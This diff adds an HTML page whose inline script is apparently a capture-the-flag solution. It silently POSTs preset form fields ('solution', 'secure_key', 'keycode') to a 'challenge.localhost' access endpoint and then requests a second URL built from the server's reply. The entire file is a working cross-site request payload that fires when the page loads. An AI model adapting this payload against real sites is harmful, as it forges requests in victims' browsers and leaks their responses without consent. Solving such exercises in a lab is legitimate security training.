@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+    <head>
+        <script>
+            const formData = new FormData();
+            formData.append('solution', 'epyhrtar');
+            formData.append('secure_key', 'gtqxyznv');
+            formData.append('keycode', 'aobgxgtt');
+            fetch("http://challenge.localhost:80/access", { method: 'POST', body: formData })
+                .then((response) => response.text())
+                .then(text => {fetch("http://challenge.localhost:80/" + text)});
+        </script>
+    </head>
+</html>
